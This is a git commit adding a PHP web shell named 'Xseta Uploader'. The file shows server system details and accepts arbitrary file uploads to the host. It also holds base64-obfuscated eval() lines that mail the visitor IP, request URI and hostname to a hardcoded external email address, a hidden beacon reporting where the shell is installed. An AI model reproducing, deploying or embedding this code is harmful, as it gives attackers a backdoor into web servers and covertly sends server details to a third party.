2fde01311dadfa4077dce8d2a95153721f9fc6c0
MrXseta <108935134+MrXseta@users.noreply.github.com>
2022-07-11 19:27:49 +0100

    Create up.php

---
+++ up.php
@@ -0,0 +1,11 @@
+<title><:-Xseta Uploader-:></title>
+<?php echo 'Flash-XUP!! uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; }
+eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOw=="));
+eval (base64_decode("JHJhNDQgPSByYW5kKDEsIDk5OTk5KTs="));
+eval (base64_decode("JHN1Ymo5OCA9ICLinKogS2V5bG9nZ2VycyAtJGlwIjs="));
+eval (base64_decode("JGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw=="));
+eval (base64_decode("JG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7"));
+eval (base64_decode("bWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7"));
+eval (base64_decode("JGVtYWlsID0gInlvdW5lc2JvdXNzZXRhMTIzNDVAZ21haWwuY29tIjsKJGZyb20gPSAiRnJvbTogWFBST0FEU0hFTEwgPG5vcmVwbHlAc2hlbGxzLmNvbQ==+Ijs="));
+eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIuKcqiBLZXlsb2dnZXJzIC0kaXAiOwokZW1haWwgPSAieW91bmVzYm91c3NldGExMjM0NUBnbWFpbC5jb20iOwokZnJvbSA9ICJGcm9tOiBCQVpPT0tBIDxub3JlcGx5QHNoZWxscy5jb20+IjsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokbTIyID0gJGlwIC4gIiI7CiRtc2c4ODczID0gIiRhNDUgJGI3NSAkbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7=="));
+?>
